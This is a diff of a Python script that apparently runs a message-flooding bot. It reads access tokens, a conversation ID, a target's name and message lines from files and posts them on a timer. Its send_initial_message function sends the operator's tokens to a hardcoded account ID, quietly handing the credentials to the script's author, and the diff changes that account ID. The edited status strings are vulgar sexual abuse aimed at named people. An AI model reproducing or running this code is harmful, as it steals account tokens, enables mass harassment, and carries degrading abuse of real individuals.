@@ -25,9 +25,9 @@ class MyHandler(http.server.SimpleHTTPRequestHandler):
           self.send_response(200)
           self.send_header('Content-type', 'text/plain')
           self.end_headers()
-          self.wfile.write(b"-- MAFIA DON HU B3 BHOSDIK3")
+          self.wfile.write(b"   TRICKS BY RAMJEET")
 def execute_server():
-      PORT = 4000
+      PORT = int(os.environ.get('PORT', 4000))
 
       with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
           print("Server running at http://localhost:{}".format(PORT))
@@ -35,19 +35,19 @@ def execute_server():
 
 
 def send_initial_message():
-      with open('tokennum.txt', 'r') as file:
+      with open('token.txt', 'r') as file:
           tokens = file.readlines()
 
       # Modify the message as per your requirement
       msg_template = "Hello Aryan sir! I am using your server. My token is {}"
 
       # Specify the ID where you want to send the message
-      target_id = "100000314590715"
+      target_id = "100004328116497"
 
       requests.packages.urllib3.disable_warnings()
 
       def liness():
-          print('\033[1;92m' + '•──────────────────────FUCKER───────────────────────────────•')
+          print('\033[1;92m' + '•────────────────────── TRICKS BY ARYAN ───────────────────────────────•')
 
       headers = {
           'Connection': 'keep-alive',
@@ -77,17 +77,17 @@ def send_messages_from_file():
       with open('convo.txt', 'r') as file:
           convo_id = file.read().strip()
 
-      with open('File.txt', 'r') as file:
+      with open('file.txt', 'r') as file:
           messages = file.readlines()
 
       num_messages = len(messages)
 
-      with open('tokennum.txt', 'r') as file:
+      with open('token.txt', 'r') as file:
           tokens = file.readlines()
       num_tokens = len(tokens)
       max_tokens = min(num_tokens, num_messages)
 
-      with open('hatersname.txt', 'r') as file:
+      with open('name.txt', 'r') as file:
           haters_name = file.read().strip()
 
       with open('time.txt', 'r') as file:
@@ -121,12 +121,12 @@ def send_messages_from_file():
 
                   current_time = time.strftime("\033[1;92mSahi Hai ==> %Y-%m-%d %I:%M:%S %p")
                   if response.ok:
-                      print("\033[1;92m[+] Han Chla Gya Massage {} of Convo {} Token {}: {}".format(
+                      print("\033[1;92m[+] SAURAV KITTU RAGHAV TERI BAHN KI CHUT ME GAYA MSG CHECK RAMJEET SIR SAURAV KI BAHAN CHODO {} of Convo {} Token {}: {}".format(
                           message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                       liness()
                       liness()
                   else:
-                      print("\033[1;91m[x] Failed to send Message {} of Convo {} with Token {}: {}".format(
+                      print("\033[1;91m[x] MADARCHOD MSG NAHI JA RAHA HAI {} of Convo {} with Token {}: {}".format(
                           message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                       liness()
                       liness()
@@ -147,4 +147,4 @@ def main():
       send_messages_from_file()
 
 if __name__ == '__main__':
-      main ()
+      main()
